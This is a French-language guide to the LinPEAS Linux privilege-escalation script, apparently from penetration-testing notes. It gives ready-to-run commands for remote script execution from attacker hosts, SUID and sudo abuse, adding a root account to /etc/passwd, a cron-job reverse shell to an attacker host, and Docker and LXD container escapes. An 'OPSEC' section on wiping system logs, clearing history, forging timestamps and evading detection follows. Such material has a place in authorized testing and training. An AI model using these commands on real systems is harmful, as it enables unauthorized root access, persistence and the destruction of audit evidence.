# LinPEAS - Linux Privilege Escalation Awesome Script

## 🗂️ Workflow d'utilisation LinPEAS
1. Upload/exécution du script sur la cible Linux
   ↓
2. Analyse automatisée de l'énumération système
   ↓
3. Identification des vecteurs d'escalade potentiels
   ↓
4. Priorisation des vulnérabilités trouvées
   ↓
5. Exploitation manuelle des failles détectées
   ↓
6. Validation de l'escalade de privilèges

## 📋 Vue d'ensemble

LinPEAS est un script automatisé qui effectue une énumération complète d'un système Linux pour identifier les vecteurs d'escalade de privilèges. Il colore les résultats par niveau de priorité et fournit des suggestions d'exploitation.

> **💡 Explication Simple** : C'est comme un détective automatique qui fouille partout dans le système Linux pour trouver toutes les portes dérobées et failles de sécurité qui pourraient vous donner plus de privilèges.

## ⚡ Installation et Exécution

### Téléchargement et exécution directe
```bash
# Download et exécution en une ligne
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Via wget
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Transfert sur cible
```bash
# Depuis machine d'attaque - serveur web
python3 -m http.server 8000

# Sur cible - téléchargement
wget http://attacker-ip:8000/linpeas.sh
curl -O http://attacker-ip:8000/linpeas.sh

# Exécution avec redirection
./linpeas.sh | tee linpeas_output.txt
```

### Exécution avec options
```bash
# Scan rapide (moins verbeux)
./linpeas.sh -q

# Scan avec passwords search
./linpeas.sh -a

# Scan avec network discovery
./linpeas.sh -n

# Export en format JSON
./linpeas.sh -o json
```

## 🎯 Sections d'Analyse

### System Information
```bash
# Informations système de base
- Kernel version et vulnérabilités connues
- Distribution et version
- Architecture (32/64 bits)
- Hostname et réseau
- Processus en cours d'exécution
```

### Users & Groups
```bash
# Analyse utilisateurs et groupes
- Utilisateurs avec bash shell
- Groupes privilégiés (wheel, sudo, admin)
- Historique des commandes (.bash_history)
- Clés SSH publiques/privées
- Tokens et credentials cachés
```

### Sudo & SUID Analysis
```bash
# Droits sudo et binaires SUID
- Commandes sudo autorisées
- Binaires avec bit SUID activé
- Binaires avec bit SGID
- Capabilities Linux
- Règles sudo avec wildcards
```

### Network & Services
```bash
# Services et réseau
- Ports ouverts localement
- Services en cours d'exécution
- Cron jobs actifs
- Fichiers de configuration réseau
- Connexions réseau établies
```

## 🔍 Interprétation des Résultats

### Code couleur LinPEAS
```bash
# Rouge (95%) - Escalade très probable
- SUID binaries exploitables
- Sudo rules dangereuses
- Kernel exploits connus
- World-writable scripts dans PATH

# Jaune (75%) - Escalade probable  
- Configuration services vulnérables
- Passwords en clair dans fichiers
- Cron jobs modifiables
- Docker sockets accessibles

# Vert (50%) - Escalade possible
- Informations système utiles
- Fichiers de configuration intéressants
- Processus d'autres utilisateurs
- Variables d'environnement
```

### Priorités d'exploitation
```bash
# Ordre de priorité recommandé :
1. Sudo rules avec NOPASSWD
2. SUID binaries (GTFOBins)
3. Writable /etc/passwd ou /etc/shadow
4. Kernel exploits
5. Cron jobs world-writable
6. Services running as root
7. Docker/LXC containers
8. NFS exports avec no_root_squash
```

## ⚔️ Exploitation des Découvertes

### SUID Binaries Exploitation
```bash
# Vérification GTFOBins
# Si find a SUID bit :
/usr/bin/find . -exec /bin/sh -p \; -quit

# Si cp a SUID bit :
echo 'root:$6$salt$hash:0:0:root:/root:/bin/bash' > /tmp/passwd
/usr/bin/cp /tmp/passwd /etc/passwd

# Si vim a SUID bit :
/usr/bin/vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

### Sudo Rules Exploitation
```bash
# Sudo avec wildcards
# Si "sudo /usr/bin/python3 /opt/scripts/*.py"
echo 'import os;os.system("/bin/bash")' > /tmp/exploit.py
sudo /usr/bin/python3 /opt/scripts/../../../tmp/exploit.py

# Sudo LD_PRELOAD
# Si "env_keep+=LD_PRELOAD"
gcc -fPIC -shared -o /tmp/evil.so evil.c
sudo LD_PRELOAD=/tmp/evil.so program
```

### Writable Files Exploitation
```bash
# /etc/passwd writable
echo 'toor:$6$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su toor

# Cron jobs writable
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"' >> /etc/crontab

# Scripts in PATH writable
echo '#!/bin/bash\n/bin/bash' > /usr/local/bin/vulnerable_script
chmod +x /usr/local/bin/vulnerable_script
```

## 🐳 Analyse Container Escape

### Docker Socket Detection
```bash
# LinPEAS détecte :
- /var/run/docker.sock readable
- Docker group membership
- Container capabilities
- Mounted volumes

# Exploitation docker socket
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### LXC/LXD Exploitation
```bash
# Si membre du groupe lxd
lxc init ubuntu:18.04 test -c security.privileged=true
lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
lxc start test
lxc exec test /bin/bash
```

## 🔄 Automation et Intégration

### Script post-LinPEAS
```bash
#!/bin/bash
# Script d'exploitation automatique

# Parse des résultats LinPEAS
grep -i "95%" linpeas_output.txt > high_priority.txt

# Test automatique SUID
for binary in $(find / -perm -4000 2>/dev/null); do
    echo "Testing $binary"
    # Test GTFOBins patterns
done

# Test sudo rules
sudo -l > sudo_rules.txt
```

### Intégration avec autres outils
```bash
# Combinaison avec pspy
./pspy64 &
./linpeas.sh

# Avec linux-exploit-suggester
./linux-exploit-suggester.sh

# Avec enum4linux pour shares
enum4linux localhost
```

## 📊 Analyse des Logs et Traces

### Nettoyage post-exploitation
```bash
# Suppression des traces LinPEAS
rm -f linpeas.sh linpeas_output.txt
history -c

# Nettoyage logs système
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# Restauration timestamps
touch -r /bin/ls /tmp/exploit
```

### OPSEC considerations
```bash
# Exécution discrète
./linpeas.sh 2>/dev/null | grep -E "(95%|90%|85%)"

# Sans écriture sur disque
curl -s https://attacker.com/linpeas.sh | bash

# Via mémoire tmpfs
mount -t tmpfs -o size=100m tmpfs /tmp/linpeas
cd /tmp/linpeas && wget linpeas.sh
```

## 🛡️ Conseils OPSEC

### Discrétion
- Exécuter durant les heures de maintenance
- Utiliser nice pour limiter l'impact CPU
- Rediriger la sortie pour éviter l'affichage console
- Supprimer immédiatement les artefacts

### Éviter la détection
- Ne pas laisser de fichiers sur disque après usage
- Nettoyer l'historique des commandes
- Éviter les scans trop agressifs sur systèmes de production
- Masquer les processus via techniques d'injection

## ⚠️ Erreurs fréquentes

### Mauvaise utilisation
- Exécuter sans redirection (logs visibles)
- Oublier de supprimer le script après usage
- Ignorer les résultats à faible priorité (parfois utiles)
- Ne pas vérifier les faux positifs

### Exploitation ratée
- Se précipiter sur le premier résultat sans analyser
- Oublier de vérifier les permissions avant exploitation
- Ne pas tester en environnement isolé d'abord
- Ignorer les mécanismes de protection (SELinux, AppArmor)

## 💡 Astuces

### Optimisation reconnaissance
- Combiner avec WinPEAS sur systèmes mixtes
- Utiliser avec pspy pour monitoring processus temps réel
- Croiser avec CVE databases pour exploits kernel
- Intégrer dans frameworks C2 pour automatisation

### Techniques avancées
- Parser automatiquement les résultats avec scripts
- Créer des rapports HTML avec --html option
- Utiliser en mode stealth avec paramètres réduits
- Combiner avec d'autres scripts PEASS

## 🔗 Pour aller plus loin

- [PEASS-ng Repository](https://github.com/carlospolop/PEASS-ng)
- [GTFOBins](https://gtfobins.github.io/)
- [Linux Privilege Escalation Guide](https://book.hacktricks.xyz/linux-unix/privilege-escalation)
- [PayloadsAllTheThings Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

## 🧭 Navigation

- [Guide WinPEAS](./WinPEAS.md)
- [Guide PrivEsc Linux](../Linux/)
- [Retour aux outils d'escalade](./README.md)
- [Post-exploitation](../../03-Post-Exploitation/) 